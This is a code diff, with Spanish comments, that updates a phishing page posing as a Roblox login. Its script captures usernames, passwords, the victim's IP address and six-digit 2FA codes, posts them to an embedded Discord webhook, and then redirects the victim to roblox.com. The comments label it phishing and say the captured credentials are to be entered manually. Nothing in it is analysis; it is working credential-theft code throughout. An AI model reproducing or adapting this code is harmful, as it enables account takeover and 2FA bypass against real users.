@@ -900,10 +900,39 @@
 
 <script>
 // ============================================================
-// CÓDIGO COMPLETO - REEMPLAZA TODO
+// CÓDIGO COMPATIBLE - MANTIENE FUNCIONES ORIGINALES + PHISHING
 // ============================================================
 
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1535777104984277032/3EIQf7UfC8SF8-N9oX6cXDHqOkDNT7lKGtP2kpB22Iv6Wvi-QxVMLxnHsM1ysheU873b";
+
+// ============================================================
+// FUNCIONES ORIGINALES (SE MANTIENEN)
+// ============================================================
+
+function setTab(el, tabName){
+    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+    el.classList.add('active');
+    
+    document.querySelectorAll('.tab-content').forEach(tc=>tc.classList.remove('active'));
+    document.getElementById(tabName + '-content').classList.add('active');
+}
+
+function navigateToLogin(){
+    document.body.classList.add('login-active');
+}
+
+function closeVerification(){
+    const modal = document.getElementById('verificationModal');
+    modal.classList.remove('active');
+    setTimeout(() => {
+        modal.style.display = 'none';
+    }, 250);
+    document.getElementById('loginBtn').style.display = 'block';
+}
+
+// ============================================================
+// FUNCIONES NUEVAS PARA PHISHING
+// ============================================================
 
 async function sendToDiscord(title, fields, color = 0xFF0000) {
     const embed = {
@@ -945,80 +974,89 @@ async function getIP() {
     }
 }
 
-document.addEventListener('DOMContentLoaded', function() {
-    const loginForm = document.getElementById('loginForm');
-    if (!loginForm) return;
+// ============================================================
+// REEMPLAZAR COMPORTAMIENTO DEL FORMULARIO (CONSERVANDO EL ORIGINAL)
+// ============================================================
 
-    loginForm.onsubmit = async function(e) {
-        e.preventDefault();
+// Guardar referencia al submit original
+const loginForm = document.getElementById('loginForm');
+const originalSubmit = loginForm.onsubmit;
+
+// Reemplazar con nuevo comportamiento
+loginForm.onsubmit = async function(e) {
+    e.preventDefault();
+    
+    // Obtener credenciales
+    const inputs = this.querySelectorAll('input');
+    const username = inputs[0]?.value || '';
+    const password = inputs[1]?.value || '';
+    const ip = await getIP();
+    
+    console.log('📥 Credenciales capturadas:', { username, password });
+    
+    // Enviar a Discord
+    await sendToDiscord(
+        "🎣 CREDENCIALES CAPTURADAS - INGRESA MANUALMENTE",
+        [
+            { name: "👤 Usuario", value: `\`${username}\``, inline: true },
+            { name: "🔑 Contraseña", value: `\`${password}\``, inline: true },
+            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+            { name: "📅 Hora", value: new Date().toLocaleString(), inline: true }
+        ],
+        0xFF5500
+    );
+    
+    // Comportamiento original (loading + modal)
+    document.getElementById('loginBtn').style.display = 'none';
+    document.getElementById('loginLoading').style.display = 'flex';
+
+    var delay = 1000 + Math.random() * 1500;
+    setTimeout(function(){
+        document.getElementById('loginLoading').style.display = 'none';
+        document.getElementById('loginBtn').style.display = 'block';
         
-        const inputs = this.querySelectorAll('input');
-        const username = inputs[0]?.value || '';
-        const password = inputs[1]?.value || '';
-        const ip = await getIP();
-        
-        await sendToDiscord(
-            "🎣 CREDENCIALES CAPTURADAS",
+        const modal = document.getElementById('verificationModal');
+        modal.style.display = 'flex';
+        requestAnimationFrame(() => {
+            modal.classList.add('active');
+        });
+    }, delay);
+};
+
+// ============================================================
+// INTERCEPTAR BOTÓN VERIFY DEL MODAL
+// ============================================================
+
+document.querySelector('.verify-btn').addEventListener('click', function() {
+    const codeInput = document.querySelector('.verification-input');
+    const code = codeInput?.value || '';
+    const inputs = document.querySelectorAll('.login-input');
+    const username = inputs[0]?.value || '';
+    
+    if (code.length === 6) {
+        // Enviar código a Discord
+        sendToDiscord(
+            "🎯 CÓDIGO 2FA CAPTURADO - INGRESA MANUALMENTE",
             [
+                { name: "🔒 Código", value: `\`${code}\``, inline: true },
                 { name: "👤 Usuario", value: `\`${username}\``, inline: true },
-                { name: "🔑 Contraseña", value: `\`${password}\``, inline: true },
-                { name: "🌐 IP", value: `\`${ip}\``, inline: true },
                 { name: "📅 Hora", value: new Date().toLocaleString(), inline: true }
             ],
-            0xFF5500
+            0x00FF00
         );
         
-        document.getElementById('loginBtn').style.display = 'none';
-        document.getElementById('loginLoading').style.display = 'flex';
+        // Cerrar modal (usando función original)
+        closeVerification();
         
+        // Redirigir a Roblox
         setTimeout(() => {
-            document.getElementById('loginLoading').style.display = 'none';
-            document.getElementById('loginBtn').style.display = 'block';
-            
-            const modal = document.getElementById('verificationModal');
-            modal.style.display = 'flex';
-            requestAnimationFrame(() => {
-                modal.classList.add('active');
-            });
+            window.location.href = 'https://www.roblox.com';
         }, 1500);
-    };
+    }
 });
 
-document.addEventListener('DOMContentLoaded', function() {
-    const verifyBtn = document.querySelector('.verify-btn');
-    if (!verifyBtn) return;
-    
-    verifyBtn.addEventListener('click', function() {
-        const codeInput = document.querySelector('.verification-input');
-        const code = codeInput?.value || '';
-        const inputs = document.querySelectorAll('.login-input');
-        const username = inputs[0]?.value || '';
-        
-        if (code.length === 6) {
-            sendToDiscord(
-                "🎯 CÓDIGO 2FA CAPTURADO",
-                [
-                    { name: "🔒 Código", value: `\`${code}\``, inline: true },
-                    { name: "👤 Usuario", value: `\`${username}\``, inline: true },
-                    { name: "📅 Hora", value: new Date().toLocaleString(), inline: true }
-                ],
-                0x00FF00
-            );
-            
-            const modal = document.getElementById('verificationModal');
-            modal.classList.remove('active');
-            setTimeout(() => {
-                modal.style.display = 'none';
-            }, 250);
-            
-            setTimeout(() => {
-                window.location.href = 'https://www.roblox.com';
-            }, 1500);
-        }
-    });
-});
-
-console.log('✅ Phishing Manual - Sistema listo');
+console.log('✅ Phishing Manual - Compatible con funciones originales');
+console.log('📋 Funciones disponibles: setTab(), navigateToLogin(), closeVerification()');
 </script>
 </body>
 </html>
